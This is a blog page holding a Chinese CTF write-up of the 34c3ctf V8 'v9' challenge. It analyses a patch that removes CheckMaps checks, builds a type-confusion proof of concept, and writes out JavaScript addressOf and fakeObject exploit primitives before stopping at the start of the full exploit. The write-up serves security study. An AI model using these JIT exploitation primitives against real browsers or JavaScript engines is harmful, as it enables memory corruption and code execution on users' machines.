@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;226710 0x00 前言结合Turbolizer来分析34c3ctf-v9的v8逃逸题 0x01 patch分析123456789101112131415161718192021222324252627282930313233343536diff --git a&#x2F;src&#x2F;compiler&#x2F;redundanc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="34c3ctf-v9">
+<meta property="og:url" content="https://github.com/ha1vk/2020/12/31/34c3ctf-v9/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;226710 0x00 前言结合Turbolizer来分析34c3ctf-v9的v8逃逸题 0x01 patch分析123456789101112131415161718192021222324252627282930313233343536diff --git a&#x2F;src&#x2F;compiler&#x2F;redundanc">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t01796899183ce73a87.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01d243e7edf66bcbef.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01f36e299696693dff.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t013090cd7c00ea247f.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01e309d64c7cefe1eb.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t011075607668d3babe.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01bffb0540aaf7ee38.png">
+<meta property="article:published_time" content="2020-12-31T02:30:57.000Z">
+<meta property="article:modified_time" content="2025-06-26T09:20:12.742Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="JS引擎漏洞">
+<meta property="article:tag" content="类型混淆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p2.ssl.qhimg.com/t01796899183ce73a87.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/12/31/34c3ctf-v9/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>34c3ctf-v9 | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/12/31/34c3ctf-v9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          34c3ctf-v9
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-31 10:30:57" itemprop="dateCreated datePublished" datetime="2020-12-31T10:30:57+08:00">2020-12-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 17:20:12" itemprop="dateModified" datetime="2025-06-26T17:20:12+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226710">https://www.anquanke.com/post/id/226710</a></p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>结合Turbolizer来分析34c3ctf-v9的v8逃逸题</p>
+<h2 id="0x01-patch分析"><a href="#0x01-patch分析" class="headerlink" title="0x01 patch分析"></a>0x01 patch分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc</span><br><span class="line">index 3a40e8d..cb51acc 100644</span><br><span class="line">--- a/src/compiler/redundancy-elimination.cc</span><br><span class="line">+++ b/src/compiler/redundancy-elimination.cc</span><br><span class="line">@@ -5,6 +5,8 @@</span><br><span class="line"> #include &quot;src/compiler/redundancy-elimination.h&quot;</span><br><span class="line"> </span><br><span class="line"> #include &quot;src/compiler/node-properties.h&quot;</span><br><span class="line">+#include &quot;src/compiler/simplified-operator.h&quot;</span><br><span class="line">+#include &quot;src/objects-inl.h&quot;</span><br><span class="line"> </span><br><span class="line"> namespace v8 &#123;</span><br><span class="line"> namespace internal &#123;</span><br><span class="line">@@ -23,6 +25,7 @@ Reduction RedundancyElimination::Reduce(Node* node) &#123;</span><br><span class="line">     case IrOpcode::kCheckHeapObject:</span><br><span class="line">     case IrOpcode::kCheckIf:</span><br><span class="line">     case IrOpcode::kCheckInternalizedString:</span><br><span class="line">+    case IrOpcode::kCheckMaps:</span><br><span class="line">     case IrOpcode::kCheckNumber:</span><br><span class="line">     case IrOpcode::kCheckReceiver:</span><br><span class="line">     case IrOpcode::kCheckSmi:</span><br><span class="line">@@ -129,6 +132,14 @@ bool IsCompatibleCheck(Node const* a, Node const* b) &#123;</span><br><span class="line">     if (a-&gt;opcode() == IrOpcode::kCheckInternalizedString &amp;&amp;</span><br><span class="line">         b-&gt;opcode() == IrOpcode::kCheckString) &#123;</span><br><span class="line">       // CheckInternalizedString(node) implies CheckString(node)</span><br><span class="line">+    &#125; else if (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span><br><span class="line">+               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span><br><span class="line">+      // CheckMaps are compatible if the first checks a subset of the second.</span><br><span class="line">+      ZoneHandleSet&lt;Map&gt; const&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">+      ZoneHandleSet&lt;Map&gt; const&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">+      if (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">+        return false;</span><br><span class="line">+      &#125;</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">       return false;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+<p>从patch中可以看到，在<code>redundancy-elimination.cc</code>源文件的<code>RedundancyElimination::Reduce</code>函数中增加了一句<code>case IrOpcode::kCheckMaps:</code>，这样对于<code>checkmaps</code>节点，也会进行<code>reduce</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">switch (node-&gt;opcode()) &#123;</span><br><span class="line">  case IrOpcode::kCheckBounds:</span><br><span class="line">  case IrOpcode::kCheckFloat64Hole:</span><br><span class="line">  case IrOpcode::kCheckHeapObject:</span><br><span class="line">  case IrOpcode::kCheckIf:</span><br><span class="line">  case IrOpcode::kCheckInternalizedString:</span><br><span class="line">  case IrOpcode::kCheckMaps:</span><br><span class="line">  case IrOpcode::kCheckNumber:</span><br><span class="line">  case IrOpcode::kCheckReceiver:</span><br><span class="line">  case IrOpcode::kCheckSmi:</span><br><span class="line">  case IrOpcode::kCheckString:</span><br><span class="line">  case IrOpcode::kCheckSeqString:</span><br><span class="line">  case IrOpcode::kCheckNotTaggedHole:</span><br><span class="line">  case IrOpcode::kCheckedFloat64ToInt32:</span><br><span class="line">  case IrOpcode::kCheckedInt32Add:</span><br><span class="line">  case IrOpcode::kCheckedInt32Sub:</span><br><span class="line">  case IrOpcode::kCheckedInt32Div:</span><br><span class="line">  case IrOpcode::kCheckedInt32Mod:</span><br><span class="line">  case IrOpcode::kCheckedInt32Mul:</span><br><span class="line">  case IrOpcode::kCheckedTaggedToFloat64:</span><br><span class="line">  case IrOpcode::kCheckedTaggedSignedToInt32:</span><br><span class="line">  case IrOpcode::kCheckedTaggedToInt32:</span><br><span class="line">  case IrOpcode::kCheckedUint32ToInt32:</span><br><span class="line">    return ReduceCheckNode(node);</span><br></pre></td></tr></table></figure>
+<p>看到<code>ReduceCheckNode</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Reduction RedundancyElimination::ReduceCheckNode(Node* node) &#123;</span><br><span class="line">  Node* const effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  EffectPathChecks const* checks = node_checks_.Get(effect);</span><br><span class="line">  // If we do not know anything about the predecessor, do not propagate just yet</span><br><span class="line">  // because we will have to recompute anyway once we compute the predecessor.</span><br><span class="line">  if (checks == nullptr) return NoChange();</span><br><span class="line">  // See if we have another check that dominates us.</span><br><span class="line">  if (Node* check = checks-&gt;LookupCheck(node)) &#123;</span><br><span class="line">    ReplaceWithValue(node, check);</span><br><span class="line">    return Replace(check);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Learn from this check.</span><br><span class="line">  return UpdateChecks(node, checks-&gt;AddCheck(zone(), node));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该函数调用<code>LookupCheck(node)</code>获得新值以后，调用<code>ReplaceWithValue(node, check)</code>将原节点进行了替换。<br>继续看到<code>LookupCheck(node)</code>函数，该函数调用了<code>IsCompatibleCheck</code>函数，如果函数返回<code>true</code>，那么就会返回<code>check-&gt;node</code>，从而可以对这个节点进行<code>Reduce</code>消除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) const &#123;</span><br><span class="line">  for (Check const* check = head_; check != nullptr; check = check-&gt;next) &#123;</span><br><span class="line">    if (IsCompatibleCheck(check-&gt;node, node)) &#123;</span><br><span class="line">      DCHECK(!check-&gt;node-&gt;IsDead());</span><br><span class="line">      return check-&gt;node;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return nullptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而<code>IsCompatibleCheck</code>函数则是被patch过的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bool IsCompatibleCheck(Node const* a, Node const* b) &#123;</span><br><span class="line">  if (a-&gt;op() != b-&gt;op()) &#123;</span><br><span class="line">    if (a-&gt;opcode() == IrOpcode::kCheckInternalizedString &amp;&amp;</span><br><span class="line">        b-&gt;opcode() == IrOpcode::kCheckString) &#123;</span><br><span class="line">      // CheckInternalizedString(node) implies CheckString(node)</span><br><span class="line">    &#125; else if (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span><br><span class="line">               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span><br><span class="line">      // CheckMaps are compatible if the first checks a subset of the second.</span><br><span class="line">      ZoneHandleSet&lt;Map&gt; const&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">      ZoneHandleSet&lt;Map&gt; const&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">      if (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  for (int i = a-&gt;op()-&gt;ValueInputCount(); --i &gt;= 0;) &#123;</span><br><span class="line">    if (a-&gt;InputAt(i) != b-&gt;InputAt(i)) return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在patch的内容分支上，程序获得两个checkmaps值，如果<code>a_maps</code>是<code>b_maps</code>的子集，那么变直接返回<code>true</code>，这将使得节点b被<code>Reduce</code>掉</p>
+<h2 id="0x02-POC构造"><a href="#0x02-POC构造" class="headerlink" title="0x02 POC构造"></a>0x02 POC构造</h2><p>首先构造，我们使用了字典对象，我们仅观察checkmaps的reduce过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var dict = &#123;a:1.1&#125;;</span><br><span class="line">function opt(obj_dict) &#123;</span><br><span class="line">   var x = obj_dict.a;</span><br><span class="line">   var y = new Array(0x10);</span><br><span class="line">   return obj_dict.a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(dict);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(dict));</span><br></pre></td></tr></table></figure>
+<p>其中为了防止<code>opt</code>函数被直接内联到for语句里，我们在里面增加了一句<code>var y = new Array(0x10);</code>，在代码里，按理来说，<code>var x = obj_dict.a;</code>和<code>return obj_dict.a;</code>都应该有一个<code>checkmaps</code>节点用于进行类型检查。我们还需要先弄清楚<code>RedundancyElimination::ReduceCheckNode</code>函数调用者是来自哪里，因此，我们在该函数下断点，然后用gdb调试。<br><img src="https://p2.ssl.qhimg.com/t01796899183ce73a87.png"><br>最终发现，该阶段发生在<code>LoadEliminationPhase</code>阶段。接下来，结合IR图来进行验证，运行d8时加入选项<code>--trace-turbo</code>。<br>在<code>Loops peeled 95</code>阶段，43这个节点<code>checkmaps</code>还存在<br><img src="https://p3.ssl.qhimg.com/t01d243e7edf66bcbef.png"><br>然后到了下一个阶段，也就是<code>Load eliminated 95</code>阶段，43节点的<code>checkmaps</code>被reduce了<br><img src="https://p0.ssl.qhimg.com/t01f36e299696693dff.png"><br>如果把patch去掉，发现在<code>Load eliminated 95</code>阶段是不会把<code>checkmaps</code>给去掉的<br><img src="https://p4.ssl.qhimg.com/t013090cd7c00ea247f.png"><br>根据上述结论，我们进一步构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var dict = &#123;a:1.1&#125;;</span><br><span class="line">function opt(obj_dict) &#123;</span><br><span class="line">   var x = obj_dict.a;</span><br><span class="line">   obj_dict.a = &#123;&#125;;</span><br><span class="line">   var y = new Array(0x10);</span><br><span class="line">   return obj_dict.a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(dict,(o)=&gt;1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(dict));</span><br></pre></td></tr></table></figure>
+<p>发现没有发生类型混淆，生成IR图进行观察,最后发现<br><img src="https://p3.ssl.qhimg.com/t01e309d64c7cefe1eb.png"><br>最后发现<code>return obj_dict.a;</code>已经是按照对待<code>HOLEY_ELEMENTS</code>类型的方式将值取出的方式。由此，我们考虑加一个函数调用，使得字典对象逃逸，这样由于<code>return obj_dict.a;</code>的checkmaps在<code>Load eliminated 95</code>阶段会被移除，而<code>Escape Analyse</code>阶段在<code>Load eliminated 95</code>阶段之后，那么就可以造成类型混淆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var dict = &#123;a:1.1&#125;;</span><br><span class="line">function opt(obj_dict,o) &#123;</span><br><span class="line">   var x = obj_dict.a;</span><br><span class="line">   o(obj_dict);</span><br><span class="line">   return obj_dict.a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(dict,(o)=&gt;i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(dict,(o)=&gt;&#123;o.a = dict&#125;));</span><br></pre></td></tr></table></figure>
+<p>测试发现确实发生了类型混淆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/v8/34c3ctf-v9/x64.debug# ./d8 poc.js</span><br><span class="line">1.8632743560757e-310</span><br></pre></td></tr></table></figure>
+<p>分析IR图<br><img src="https://p1.ssl.qhimg.com/t011075607668d3babe.png"><br>可以看到，在调用完函数后，没有对dict的类型重新进行检查，那么，我们在函数里改变了dict里a属性的类型，但是代码仍然用的是对待原来<code>double elements</code>的方式来取出值，由此发生类型混淆<br><img src="https://p5.ssl.qhimg.com/t01bffb0540aaf7ee38.png"></p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>首先构造<code>addressOf</code>原语</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function addressOf_opt(dict,f) &#123;</span><br><span class="line">   var x = dict.a;</span><br><span class="line">   f(dict);</span><br><span class="line">   return dict.a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var double_dict = &#123;a:1.1&#125;;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   addressOf_opt(double_dict,(o)=&gt;1);</span><br><span class="line">   addressOf_opt(double_dict,(o)=&gt;2);</span><br><span class="line">   addressOf_opt(double_dict,(o)=&gt;3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   var x = addressOf_opt(double_dict,(o)=&gt;&#123;o.a = obj&#125;);</span><br><span class="line">   return [u64_h(x),u64_l(x) - 0x1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后构造<code>fakeObject</code>原语</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function fakeObject_opt(dict,f,addr) &#123;</span><br><span class="line">   var x = dict.b;</span><br><span class="line">   f(dict);</span><br><span class="line">   dict.b = addr;</span><br><span class="line">   return dict;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">var obj_dict = &#123;b:2.2&#125;;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   fakeObject_opt(obj_dict,(o)=&gt;1,1.1);</span><br><span class="line">   fakeObject_opt(obj_dict,(o)=&gt;2,2.2);</span><br><span class="line">   fakeObject_opt(obj_dict,(o)=&gt;3,3.3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObject(addr_h,addr_l) &#123;</span><br><span class="line">   var obj1 = fakeObject_opt(obj_dict,(o)=&gt;&#123;o.b = obj;&#125;,p64f(addr_l+0x1,addr_h)).b;</span><br><span class="line">   return obj1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在构造fakeObject原语时，在<code>fakeObject_opt</code>时，我们没有直接返回<code>dict.b</code>而是返回<code>dict</code>对象，因为我们在前一句有<code>dict.b = addr;</code>，在与<code>return</code>之间没有进行其他逃逸操作，因此直接返回<code>dict.b</code>会在<code>Escape Analyse</code>阶段折叠掉。<br>构造好这两个原语以后，就是常规利用了<br>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 